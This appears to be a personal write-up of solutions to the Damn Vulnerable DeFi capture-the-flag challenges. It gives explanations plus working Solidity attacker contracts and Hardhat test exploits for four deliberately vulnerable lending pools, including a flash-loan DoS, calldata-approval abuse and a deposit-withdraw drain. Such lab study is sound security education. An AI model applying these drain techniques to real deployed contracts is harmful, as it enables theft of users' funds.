damn vulnerable defi
====================

![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

https://www.damnvulnerabledefi.xyz/

contracts are in the `contracts` dir
solutions are in the `test` dir

just do `yarn run unstoppable` or whatever to run the test

---

unstoppable
-----------

"There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

If only there was a way to attack and stop the pool from offering flash loans ...

You start with 100 DVT tokens in balance."

solution:

flash loans are uncollatoralized loans, but the borrower must pay back the loan in the same block with interest.

in the `flashLoan` function, we can fail the assert if `poolBalance` != `balanceBefore`. if we just call `transfer` and send the tokens to the pool, `poolBalance` would not be updated so the assert would fail.

as such:

```js
it('Exploit', async function () {
    await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
```

---

naive receiver
--------------

"There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)"

solution:

the flash loan can be initiated by the receiver as there are no checks in place.

```js
it('Exploit', async function () {
    for (let i = 0; i < 10; i++) {
        await this.pool.connect(attacker).flashLoan(this.receiver.address, "0");
    }
});
```

truster
-------

"More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction."

The exploit lies in the fact that a generic `bytes calldata data` argument is supplied to the `flashLoan` function.

The function passed into this is the ERC20 approval function, which grants permission to other addresses to spend tokens on their behalf. When calling the `exploit` function in the `exploitTruster` contract, this is passed into the `flashLoan` function which grants approval to the attacker, after which the tokens are transferred.

```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract ExploitTruster {
    TrusterLenderPool pool;
    IERC20 public immutable DVT;

    constructor(address _pool, address _tokenAddress) {
        pool = TrusterLenderPool(_pool);
        DVT = IERC20(_tokenAddress);
    }

    function exploit(
        uint256 _amount,
        address _borrower,
        address _target,
        bytes calldata _data) external {
            /* approves attacker to transfer */
            pool.flashLoan(_amount, _borrower, _target, _data);
            /* transfer from pool */
            DVT.transferFrom(address(pool), msg.sender, 1000000 ether);
        }
}
```

```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const ExploitTrusterFactory = await ethers.getContractFactory('ExploitTruster', attacker);
    /* pool and DVT address in args */
    const exploitContract = await ExploitTrusterFactory.deploy(this.pool.address, this.token.address);

    /* ERC20 approve function */
    const abi = ["function approve(address spender, uint256 amount)"];
    const interface = new ethers.utils.Interface(abi);
    const data = interface.encodeFunctionData("approve", [exploitContract.address, TOKENS_IN_POOL]);

    await exploitContract.exploit(0, attacker.address, this.token.address, data);
});
```

side entrance
-------------

"A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool."


The flashloan will call `execute` which we can implement. We can initiate the `flashLoan` to borrow which will call `execute` which can deposit the borrowed tokens back to the pool. We can then withdraw them.

```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract ExploitSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function exploit(uint256 amount) external {
        /* get the flashloan which deposits back into the contract */
        pool.flashLoan(amount);
        /* wthdraw */
        pool.withdraw();
    }

    function execute() external payable {
        /* so the flashloan deposits */
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        /* send money back to attacker wallet */
        owner.transfer(address(this).balance);
    }
}
```

```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const ExploitSideEntranceFactory = await ethers.getContractFactory('ExploitSideEntrance', attacker);
    const exploitContract = await ExploitSideEntranceFactory.deploy(this.pool.address);

    await exploitContract.exploit(ETHER_IN_POOL);
});
```









todo:
* the rewarder
* selfie
* compromised
* puppet
* puppet v2
* free rider
* backdoor
* climber
* safe miners
